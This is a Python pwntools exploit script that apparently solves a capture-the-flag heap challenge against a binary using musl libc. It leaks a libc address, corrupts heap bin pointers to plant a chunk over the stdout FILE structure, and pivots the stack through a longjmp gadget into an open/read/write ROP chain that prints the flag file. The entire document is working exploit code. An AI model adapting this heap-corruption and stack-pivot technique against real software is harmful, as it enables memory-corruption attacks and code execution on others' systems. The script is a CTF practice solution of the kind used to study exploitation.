from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('./pwn')
# io = remote('node4.buuoj.cn', 26888)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
libc = ELF('libc.so')
elf = ELF('./pwn')


def add(content):
    io.sendlineafter('>>', '1')
    io.sendafter('Please input the content\n', content)


def delete(index):
    io.sendlineafter('>>', '2')
    io.sendlineafter('idx:\n', str(index))


def show(index):
    io.sendlineafter('>>', '3')
    io.sendlineafter('idx\n', str(index))


def edit(index, content):
    io.sendlineafter('>>', '4')
    io.sendlineafter('idx:\n', str(index))
    io.sendafter('Content\n', content)


def pwn():
    add(b'a' * 8)               # index0
    add(b'b' * 8)               # index1
    show(0)
    io.recvuntil(b'a' * 8)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x292e50
    log.success('libc_base: ' + hex(libc_base))
    delete(0)
    __stdout_FILE = libc_base + libc.sym['__stdout_FILE']
    chunk0 = libc_base + 0x2953b0
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    mal = libc_base + libc.sym['mal']
    bins_16 = mal + 8 + 0x18 * 16
    long_jmp = libc_base + 0x4951a
    '''
        mov     rdx, [rdi+30h]
        mov     rsp, rdx
        mov     rdx, [rdi+38h]
        jmp     rdx
    '''
    pop_rdi_ret = libc_base + 0x14862
    pop_rsi_ret = libc_base + 0x1c237
    pop_rdx_ret = libc_base + 0x1bea2
    ret = libc_base + 0xcdc
    edit(0, p64(__stdout_FILE - 0x10) * 2)
    add(b'a' * 8)               # index2(0)
    delete(0)                   # set binmap[16]
    
    edit(0, p64(bins_16 - 0x10) + p64(__stdout_FILE - 0x10))
    

    payload = b'./flag\x00\x00'
    # open('./flag', 0, 0)
    payload += p64(pop_rdi_ret) + p64(chunk0 + 0x10) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    # read(3, __stdout_FILE, 0x40)
    payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(chunk0 + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    # write(1, __stdout_FILE, 0x40)
    payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(chunk0 + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    add(payload)                # index3(0)

    # gdb.attach(io)
    payload = b'a' * 0x30 + p64(__stdout_FILE + 0x50) + p64(ret) + p64(0) + p64(long_jmp)
    payload += p64(pop_rdi_ret) + p64(__stdout_FILE + 0x38) + p64(long_jmp) + p64(chunk0 + 0x18) + p64(ret)
    add(payload)                # index4(stdout)
    # pause()
    flag = io.recvline()
    log.success(str(flag))


if __name__ == '__main__':
    pwn()
